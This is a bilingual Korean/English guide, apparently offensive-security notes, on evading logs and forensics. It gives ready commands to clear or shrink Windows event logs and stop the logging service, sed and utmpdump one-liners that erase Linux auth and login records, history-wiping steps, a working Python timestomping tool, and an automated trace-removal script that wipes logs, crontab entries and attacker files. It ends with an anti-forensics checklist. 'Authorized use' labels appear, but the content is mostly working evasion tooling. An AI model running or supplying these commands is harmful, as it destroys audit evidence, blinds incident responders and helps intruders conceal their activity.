> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 로그 우회 — 이벤트 로그 조작·흔적 제거·포렌식 대응

## 1. Windows 이벤트 로그 구조

```
Windows 이벤트 로그 채널:
├── Security   — 인증·감사·권한 (보안 이벤트)
├── System     — OS 이벤트·드라이버·서비스
├── Application — 애플리케이션 이벤트
├── Sysmon    — 프로세스·네트워크·파일 (Microsoft Sysinternals)
└── PowerShell — PowerShell 실행 이벤트 (4103, 4104)

중요 보안 이벤트 ID:
  4624 — 로그온 성공
  4625 — 로그온 실패
  4648 — 명시적 자격증명 로그온
  4688 — 프로세스 생성 (Audit Process Creation 활성화 시)
  4698 — 예약된 작업 생성
  4720 — 사용자 계정 생성
  7045 — 서비스 설치
```

---

## 2. 이벤트 로그 조작 (Windows)

```powershell
# 특정 채널 로그 삭제 (관리자 권한 필요)
Clear-EventLog -LogName Security
Clear-EventLog -LogName System
wevtutil cl Security
wevtutil cl System
wevtutil cl "Microsoft-Windows-PowerShell/Operational"

# 특정 이벤트 ID만 삭제 (PowerShell)
$events = Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4624]]"
# 직접 삭제 불가 — 전체 지우거나 로그 크기 조작

# 이벤트 로그 서비스 중지 (위험: 탐지됨)
Stop-Service -Name EventLog -Force
# 대안: 최대 크기 줄여 덮어쓰기
wevtutil sl Security /ms:1024  # 1KB로 설정 → 즉시 덮어씌워짐
```

### 2.1 선택적 이벤트 삭제 (C#/.NET)

```csharp
// 특정 이벤트 레코드 삭제 — 이벤트 로그 파일 직접 조작
using System.Diagnostics.Eventing.Reader;

static void DeleteEventById(string logName, long eventId)
{
    using var session = new EventLogSession();
    var query = new EventLogQuery(logName, PathType.LogName,
        $"*[System[EventID={eventId}]]");

    using var reader = new EventLogReader(query);
    // 직접 삭제 API 없음 — 로그 파일 오프라인 편집 필요
    // 대안: Invoke-Phant0m (이벤트 로그 스레드 suspend)
}
```

---

## 3. Linux 로그 조작

```bash
# /var/log/auth.log 특정 IP 항목 삭제
sed -i '/192\.168\.1\.100/d' /var/log/auth.log
sed -i '/Failed password/d' /var/log/auth.log

# 마지막 로그인 기록 삭제 (wtmp/btmp)
# wtmp: 성공한 로그인
# btmp: 실패한 로그인
utmpdump /var/log/wtmp | grep -v "attacker" | utmpdump -r > /tmp/wtmp.clean
cp /tmp/wtmp.clean /var/log/wtmp

# lastlog 초기화
> /var/log/lastlog  # 전체 삭제
# 또는 Python으로 특정 항목 제거

# bash 히스토리 제거
history -c && history -w
unset HISTFILE
export HISTSIZE=0
# 또는
cat /dev/null > ~/.bash_history

# 현재 세션 로그인 흔적 제거
# utmp는 현재 로그인 세션 추적
who  # 현재 로그인 목록
# 세션 종료 전 utmp에서 제거 (루트 필요)

# syslog 항목 삭제
sed -i "/$(date +'%b %e')/d" /var/log/syslog
```

---

## 4. 타임스탬프 조작 (Timestomping)

```python
#!/usr/bin/env python3
"""파일 타임스탬프 조작 CLI — 포렌식 타임라인 혼란."""

import argparse
import os
import stat
from datetime import datetime
from pathlib import Path


def stomp_timestamp(
    filepath: Path,
    mtime: datetime | None = None,
    atime: datetime | None = None,
    reference_file: Path | None = None,
) -> None:
    """파일 수정/접근 시간 조작."""
    if reference_file:
        ref_stat = reference_file.stat()
        os.utime(filepath, (ref_stat.st_atime, ref_stat.st_mtime))
        print(f"[+] {filepath} → {reference_file} 타임스탬프 복사")
        return

    target_atime = atime.timestamp() if atime else filepath.stat().st_atime
    target_mtime = mtime.timestamp() if mtime else filepath.stat().st_mtime
    os.utime(filepath, (target_atime, target_mtime))
    print(f"[+] {filepath} 타임스탬프 수정")
    print(f"  atime: {datetime.fromtimestamp(target_atime)}")
    print(f"  mtime: {datetime.fromtimestamp(target_mtime)}")


def batch_stomp(
    directory: Path,
    reference_file: Path,
    pattern: str = "*",
) -> int:
    """디렉터리 내 파일 타임스탬프 일괄 조작."""
    count = 0
    ref_stat = reference_file.stat()

    for filepath in directory.rglob(pattern):
        if filepath.is_file():
            os.utime(filepath, (ref_stat.st_atime, ref_stat.st_mtime))
            count += 1

    return count


def check_timestomp(filepath: Path) -> dict:
    """타임스탬프 조작 여부 탐지 힌트."""
    s = filepath.stat()
    info = {
        "atime": datetime.fromtimestamp(s.st_atime).isoformat(),
        "mtime": datetime.fromtimestamp(s.st_mtime).isoformat(),
        "ctime": datetime.fromtimestamp(s.st_ctime).isoformat(),
        "size_bytes": s.st_size,
    }

    # mtime이 ctime보다 이전 — 의심 (ctime은 수정 불가)
    if s.st_mtime < s.st_ctime - 1:
        info["suspicious"] = "mtime < ctime — 타임스탬프 조작 의심"

    # 타임스탬프가 파일 내용과 불일치
    if os.name == "nt":
        # Windows: $FILE_NAME MFT 속성 vs $STANDARD_INFORMATION 비교 필요
        info["note"] = "Windows에서는 MFT $FILE_NAME과 $STANDARD_INFORMATION 비교 필요"

    return info


def main() -> None:
    parser = argparse.ArgumentParser(description="파일 타임스탬프 조작 (포렌식 교육용)")
    sub = parser.add_subparsers(dest="cmd", required=True)

    stomp_p = sub.add_parser("stomp", help="타임스탬프 조작")
    stomp_p.add_argument("target", type=Path)
    stomp_p.add_argument("--mtime", help="수정 시간 (YYYY-MM-DD HH:MM:SS)")
    stomp_p.add_argument("--atime", help="접근 시간 (YYYY-MM-DD HH:MM:SS)")
    stomp_p.add_argument("--ref", type=Path, help="참조 파일 타임스탬프 복사")

    batch_p = sub.add_parser("batch", help="디렉터리 일괄 조작")
    batch_p.add_argument("directory", type=Path)
    batch_p.add_argument("ref", type=Path, help="참조 파일")
    batch_p.add_argument("--pattern", default="*")

    check_p = sub.add_parser("check", help="조작 여부 탐지")
    check_p.add_argument("target", type=Path)

    args = parser.parse_args()

    match args.cmd:
        case "stomp":
            mtime = datetime.fromisoformat(args.mtime) if args.mtime else None
            atime = datetime.fromisoformat(args.atime) if args.atime else None
            stomp_timestamp(args.target, mtime, atime, args.ref)

        case "batch":
            count = batch_stomp(args.directory, args.ref, args.pattern)
            print(f"[+] {count}개 파일 타임스탬프 수정 완료")

        case "check":
            import json
            info = check_timestomp(args.target)
            print(json.dumps(info, indent=2, ensure_ascii=False))


if __name__ == "__main__":
    main()
```

---

## 5. 흔적 제거 자동화 CLI

```python
#!/usr/bin/env python3
"""침투 테스트 후 흔적 제거 체크리스트 자동화 (허가된 환경 전용)."""

import argparse
import os
import platform
import subprocess
import shutil
from dataclasses import dataclass, field
from pathlib import Path


@dataclass
class CleanupTask:
    name: str
    completed: bool = False
    error: str = ""


class TraceRemover:
    def __init__(self, dry_run: bool = True) -> None:
        self.dry_run = dry_run
        self.tasks: list[CleanupTask] = []

    def run_cmd(self, cmd: list[str], check: bool = False) -> subprocess.CompletedProcess:
        if self.dry_run:
            print(f"  [DRY-RUN] {' '.join(cmd)}")
            return subprocess.CompletedProcess(cmd, 0)
        return subprocess.run(cmd, capture_output=True, text=True, check=check)

    def remove_bash_history(self) -> None:
        task = CleanupTask("bash 히스토리 삭제")
        history_file = Path.home() / ".bash_history"
        try:
            if not self.dry_run:
                history_file.write_text("")
                os.system("history -c")
            task.completed = True
        except OSError as e:
            task.error = str(e)
        self.tasks.append(task)

    def remove_temp_files(self, patterns: list[str]) -> None:
        task = CleanupTask(f"임시 파일 삭제: {patterns}")
        count = 0
        try:
            for tmp_dir in [Path("/tmp"), Path("/var/tmp")]:
                for pattern in patterns:
                    for f in tmp_dir.glob(pattern):
                        if not self.dry_run:
                            f.unlink(missing_ok=True)
                        count += 1
                        print(f"  삭제: {f}")
            task.completed = True
            task.error = f"{count}개 삭제"
        except Exception as e:
            task.error = str(e)
        self.tasks.append(task)

    def remove_ssh_known_hosts(self, hosts: list[str]) -> None:
        task = CleanupTask(f"SSH known_hosts에서 제거: {hosts}")
        known_hosts = Path.home() / ".ssh" / "known_hosts"
        try:
            if known_hosts.exists() and not self.dry_run:
                for host in hosts:
                    self.run_cmd(["ssh-keygen", "-R", host])
            task.completed = True
        except Exception as e:
            task.error = str(e)
        self.tasks.append(task)

    def clear_linux_logs(self, specific_ip: str | None = None) -> None:
        task = CleanupTask("Linux 로그 정리")
        log_files = [
            "/var/log/auth.log",
            "/var/log/secure",
            "/var/log/messages",
            "/var/log/syslog",
        ]
        try:
            for log_file in log_files:
                if not Path(log_file).exists():
                    continue
                if specific_ip and not self.dry_run:
                    self.run_cmd(["sed", "-i", f"/{specific_ip}/d", log_file])
                elif not specific_ip and not self.dry_run:
                    Path(log_file).write_text("")
                print(f"  처리: {log_file}")
            task.completed = True
        except Exception as e:
            task.error = str(e)
        self.tasks.append(task)

    def remove_crontab_entries(self, keyword: str) -> None:
        task = CleanupTask(f"crontab 항목 제거: {keyword}")
        try:
            if not self.dry_run:
                result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
                filtered = "\n".join(
                    line for line in result.stdout.splitlines()
                    if keyword not in line
                )
                proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE)
                proc.communicate(filtered.encode())
            task.completed = True
        except Exception as e:
            task.error = str(e)
        self.tasks.append(task)

    def print_report(self) -> None:
        print("\n=== 흔적 제거 리포트 ===")
        for task in self.tasks:
            status = "✓" if task.completed else "✗"
            print(f"[{status}] {task.name}")
            if task.error:
                print(f"     {task.error}")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="침투 테스트 흔적 제거 자동화 (허가된 환경 전용)"
    )
    parser.add_argument("--dry-run", action="store_true", default=True,
                        help="실제 실행 없이 시뮬레이션 (기본값)")
    parser.add_argument("--execute", action="store_true",
                        help="실제 실행 (--dry-run 오버라이드)")
    parser.add_argument("--ip", help="로그에서 제거할 IP 주소")
    parser.add_argument("--temp-patterns", nargs="+",
                        default=["*.exe", "*.ps1", "*.py", "nc", "beacon"],
                        help="삭제할 임시 파일 패턴")
    parser.add_argument("--cron-keyword", help="crontab에서 제거할 키워드")
    args = parser.parse_args()

    dry_run = not args.execute
    if not dry_run:
        print("[!] 실제 실행 모드 — 허가된 환경에서만 사용하세요")
        confirm = input("계속? (yes/no): ")
        if confirm.lower() != "yes":
            return

    remover = TraceRemover(dry_run=dry_run)

    remover.remove_bash_history()
    remover.remove_temp_files(args.temp_patterns)

    if args.ip:
        remover.clear_linux_logs(args.ip)

    if args.cron_keyword:
        remover.remove_crontab_entries(args.cron_keyword)

    remover.print_report()


if __name__ == "__main__":
    main()
```

---

## 6. 포렌식 대응 체크리스트

| 항목 | Windows | Linux |
|------|---------|-------|
| 이벤트 로그 | wevtutil cl | journalctl --vacuum-time |
| 명령 히스토리 | `doskey /reinstall` (cmd) / `Clear-History` (PS) | `history -c; unset HISTFILE` |
| 프리패치 | `del /F C:\Windows\Prefetch\*` | 해당 없음 |
| 레지스트리 | RunMRU·RecentDocs·UserAssist 삭제 | 해당 없음 |
| 네트워크 캐시 | `arp -d *; ipconfig /flushdns` | `ip neigh flush all` |
| 임시 파일 | `%TEMP%` 삭제 | `/tmp`, `/var/tmp` |
| 타임스탬프 | Timestomping (MFT 수정) | `touch -t` |
| 로그인 기록 | lastlog·wtmp 수정 | `utmpdump` |
| 슬랙 공간 | SDelete (Microsoft) | `wipe`/`shred` |

---

<a name="english"></a>

# Log Evasion — Event Log Manipulation, Trace Removal, and Forensic Countermeasures

## 1. Windows Event Log Structure

```
Windows Event Log Channels:
├── Security   — Authentication, auditing, privileges (security events)
├── System     — OS events, drivers, services
├── Application — Application events
├── Sysmon    — Process, network, file activity (Microsoft Sysinternals)
└── PowerShell — PowerShell execution events (4103, 4104)

Key Security Event IDs:
  4624 — Logon success
  4625 — Logon failure
  4648 — Logon with explicit credentials
  4688 — Process creation (requires Audit Process Creation enabled)
  4698 — Scheduled task created
  4720 — User account created
  7045 — Service installed
```

---

## 2. Event Log Manipulation (Windows)

```powershell
# Clear specific channel logs (requires administrator privileges)
Clear-EventLog -LogName Security
Clear-EventLog -LogName System
wevtutil cl Security
wevtutil cl System
wevtutil cl "Microsoft-Windows-PowerShell/Operational"

# Delete specific event IDs only (PowerShell)
$events = Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4624]]"
# Direct deletion not possible — clear entire log or manipulate log size

# Stop event log service (dangerous: detectable)
Stop-Service -Name EventLog -Force
# Alternative: reduce max size to force overwrite
wevtutil sl Security /ms:1024  # Set to 1KB → immediately overwritten
```

### 2.1 Selective Event Deletion (C#/.NET)

```csharp
// Delete specific event records — requires direct manipulation of event log files
using System.Diagnostics.Eventing.Reader;

static void DeleteEventById(string logName, long eventId)
{
    using var session = new EventLogSession();
    var query = new EventLogQuery(logName, PathType.LogName,
        $"*[System[EventID={eventId}]]");

    using var reader = new EventLogReader(query);
    // No direct delete API — requires offline editing of log file
    // Alternative: Invoke-Phant0m (suspends event log thread)
}
```

---

## 3. Linux Log Manipulation

```bash
# Remove specific IP entries from /var/log/auth.log
sed -i '/192\.168\.1\.100/d' /var/log/auth.log
sed -i '/Failed password/d' /var/log/auth.log

# Clear last login records (wtmp/btmp)
# wtmp: successful logins
# btmp: failed logins
utmpdump /var/log/wtmp | grep -v "attacker" | utmpdump -r > /tmp/wtmp.clean
cp /tmp/wtmp.clean /var/log/wtmp

# Clear lastlog
> /var/log/lastlog  # Delete all entries
# Or use Python to remove specific entries

# Remove bash history
history -c && history -w
unset HISTFILE
export HISTSIZE=0
# Or
cat /dev/null > ~/.bash_history

# Remove current session login trace
# utmp tracks current login sessions
who  # List current logins
# Remove from utmp before session ends (requires root)

# Delete syslog entries
sed -i "/$(date +'%b %e')/d" /var/log/syslog
```

---

## 4. Timestamp Manipulation (Timestomping)

```python
#!/usr/bin/env python3
"""File timestamp manipulation CLI — confusing forensic timelines."""

import argparse
import os
import stat
from datetime import datetime
from pathlib import Path


def stomp_timestamp(
    filepath: Path,
    mtime: datetime | None = None,
    atime: datetime | None = None,
    reference_file: Path | None = None,
) -> None:
    """Manipulate file modification and access times."""
    if reference_file:
        ref_stat = reference_file.stat()
        os.utime(filepath, (ref_stat.st_atime, ref_stat.st_mtime))
        print(f"[+] {filepath} → copied timestamps from {reference_file}")
        return

    target_atime = atime.timestamp() if atime else filepath.stat().st_atime
    target_mtime = mtime.timestamp() if mtime else filepath.stat().st_mtime
    os.utime(filepath, (target_atime, target_mtime))
    print(f"[+] Timestamps modified: {filepath}")
    print(f"  atime: {datetime.fromtimestamp(target_atime)}")
    print(f"  mtime: {datetime.fromtimestamp(target_mtime)}")


def batch_stomp(
    directory: Path,
    reference_file: Path,
    pattern: str = "*",
) -> int:
    """Batch-manipulate timestamps for all files in a directory."""
    count = 0
    ref_stat = reference_file.stat()

    for filepath in directory.rglob(pattern):
        if filepath.is_file():
            os.utime(filepath, (ref_stat.st_atime, ref_stat.st_mtime))
            count += 1

    return count


def check_timestomp(filepath: Path) -> dict:
    """Detect hints of timestamp manipulation."""
    s = filepath.stat()
    info = {
        "atime": datetime.fromtimestamp(s.st_atime).isoformat(),
        "mtime": datetime.fromtimestamp(s.st_mtime).isoformat(),
        "ctime": datetime.fromtimestamp(s.st_ctime).isoformat(),
        "size_bytes": s.st_size,
    }

    # mtime earlier than ctime — suspicious (ctime cannot be modified)
    if s.st_mtime < s.st_ctime - 1:
        info["suspicious"] = "mtime < ctime — possible timestamp manipulation"

    # Timestamp inconsistent with file content
    if os.name == "nt":
        # Windows: requires comparison of MFT $FILE_NAME vs $STANDARD_INFORMATION
        info["note"] = "On Windows, compare MFT $FILE_NAME and $STANDARD_INFORMATION attributes"

    return info


def main() -> None:
    parser = argparse.ArgumentParser(description="File timestamp manipulation (for forensics education)")
    sub = parser.add_subparsers(dest="cmd", required=True)

    stomp_p = sub.add_parser("stomp", help="Manipulate timestamps")
    stomp_p.add_argument("target", type=Path)
    stomp_p.add_argument("--mtime", help="Modification time (YYYY-MM-DD HH:MM:SS)")
    stomp_p.add_argument("--atime", help="Access time (YYYY-MM-DD HH:MM:SS)")
    stomp_p.add_argument("--ref", type=Path, help="Copy timestamps from reference file")

    batch_p = sub.add_parser("batch", help="Batch manipulate directory")
    batch_p.add_argument("directory", type=Path)
    batch_p.add_argument("ref", type=Path, help="Reference file")
    batch_p.add_argument("--pattern", default="*")

    check_p = sub.add_parser("check", help="Detect manipulation")
    check_p.add_argument("target", type=Path)

    args = parser.parse_args()

    match args.cmd:
        case "stomp":
            mtime = datetime.fromisoformat(args.mtime) if args.mtime else None
            atime = datetime.fromisoformat(args.atime) if args.atime else None
            stomp_timestamp(args.target, mtime, atime, args.ref)

        case "batch":
            count = batch_stomp(args.directory, args.ref, args.pattern)
            print(f"[+] Timestamps modified for {count} files")

        case "check":
            import json
            info = check_timestomp(args.target)
            print(json.dumps(info, indent=2, ensure_ascii=False))


if __name__ == "__main__":
    main()
```

---

## 5. Trace Removal Automation CLI

```python
#!/usr/bin/env python3
"""Post-penetration test trace removal checklist automation (authorized environments only)."""

import argparse
import os
import platform
import subprocess
import shutil
from dataclasses import dataclass, field
from pathlib import Path


@dataclass
class CleanupTask:
    name: str
    completed: bool = False
    error: str = ""


class TraceRemover:
    def __init__(self, dry_run: bool = True) -> None:
        self.dry_run = dry_run
        self.tasks: list[CleanupTask] = []

    def run_cmd(self, cmd: list[str], check: bool = False) -> subprocess.CompletedProcess:
        if self.dry_run:
            print(f"  [DRY-RUN] {' '.join(cmd)}")
            return subprocess.CompletedProcess(cmd, 0)
        return subprocess.run(cmd, capture_output=True, text=True, check=check)

    def remove_bash_history(self) -> None:
        task = CleanupTask("Remove bash history")
        history_file = Path.home() / ".bash_history"
        try:
            if not self.dry_run:
                history_file.write_text("")
                os.system("history -c")
            task.completed = True
        except OSError as e:
            task.error = str(e)
        self.tasks.append(task)

    def remove_temp_files(self, patterns: list[str]) -> None:
        task = CleanupTask(f"Remove temp files: {patterns}")
        count = 0
        try:
            for tmp_dir in [Path("/tmp"), Path("/var/tmp")]:
                for pattern in patterns:
                    for f in tmp_dir.glob(pattern):
                        if not self.dry_run:
                            f.unlink(missing_ok=True)
                        count += 1
                        print(f"  Removing: {f}")
            task.completed = True
            task.error = f"{count} files removed"
        except Exception as e:
            task.error = str(e)
        self.tasks.append(task)

    def remove_ssh_known_hosts(self, hosts: list[str]) -> None:
        task = CleanupTask(f"Remove from SSH known_hosts: {hosts}")
        known_hosts = Path.home() / ".ssh" / "known_hosts"
        try:
            if known_hosts.exists() and not self.dry_run:
                for host in hosts:
                    self.run_cmd(["ssh-keygen", "-R", host])
            task.completed = True
        except Exception as e:
            task.error = str(e)
        self.tasks.append(task)

    def clear_linux_logs(self, specific_ip: str | None = None) -> None:
        task = CleanupTask("Clear Linux logs")
        log_files = [
            "/var/log/auth.log",
            "/var/log/secure",
            "/var/log/messages",
            "/var/log/syslog",
        ]
        try:
            for log_file in log_files:
                if not Path(log_file).exists():
                    continue
                if specific_ip and not self.dry_run:
                    self.run_cmd(["sed", "-i", f"/{specific_ip}/d", log_file])
                elif not specific_ip and not self.dry_run:
                    Path(log_file).write_text("")
                print(f"  Processing: {log_file}")
            task.completed = True
        except Exception as e:
            task.error = str(e)
        self.tasks.append(task)

    def remove_crontab_entries(self, keyword: str) -> None:
        task = CleanupTask(f"Remove crontab entries: {keyword}")
        try:
            if not self.dry_run:
                result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
                filtered = "\n".join(
                    line for line in result.stdout.splitlines()
                    if keyword not in line
                )
                proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE)
                proc.communicate(filtered.encode())
            task.completed = True
        except Exception as e:
            task.error = str(e)
        self.tasks.append(task)

    def print_report(self) -> None:
        print("\n=== Trace Removal Report ===")
        for task in self.tasks:
            status = "✓" if task.completed else "✗"
            print(f"[{status}] {task.name}")
            if task.error:
                print(f"     {task.error}")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Penetration test trace removal automation (authorized environments only)"
    )
    parser.add_argument("--dry-run", action="store_true", default=True,
                        help="Simulate without executing (default)")
    parser.add_argument("--execute", action="store_true",
                        help="Actually execute (overrides --dry-run)")
    parser.add_argument("--ip", help="IP address to remove from logs")
    parser.add_argument("--temp-patterns", nargs="+",
                        default=["*.exe", "*.ps1", "*.py", "nc", "beacon"],
                        help="Temp file patterns to delete")
    parser.add_argument("--cron-keyword", help="Keyword to remove from crontab")
    args = parser.parse_args()

    dry_run = not args.execute
    if not dry_run:
        print("[!] Live execution mode — use only in authorized environments")
        confirm = input("Continue? (yes/no): ")
        if confirm.lower() != "yes":
            return

    remover = TraceRemover(dry_run=dry_run)

    remover.remove_bash_history()
    remover.remove_temp_files(args.temp_patterns)

    if args.ip:
        remover.clear_linux_logs(args.ip)

    if args.cron_keyword:
        remover.remove_crontab_entries(args.cron_keyword)

    remover.print_report()


if __name__ == "__main__":
    main()
```

---

## 6. Forensic Countermeasure Checklist

| Item | Windows | Linux |
|------|---------|-------|
| Event logs | wevtutil cl | journalctl --vacuum-time |
| Command history | `doskey /reinstall` (cmd) / `Clear-History` (PS) | `history -c; unset HISTFILE` |
| Prefetch | `del /F C:\Windows\Prefetch\*` | N/A |
| Registry | Delete RunMRU, RecentDocs, UserAssist | N/A |
| Network cache | `arp -d *; ipconfig /flushdns` | `ip neigh flush all` |
| Temp files | Delete `%TEMP%` | `/tmp`, `/var/tmp` |
| Timestamps | Timestomping (MFT modification) | `touch -t` |
| Login records | Modify lastlog/wtmp | `utmpdump` |
| Slack space | SDelete (Microsoft) | `wipe`/`shred` |
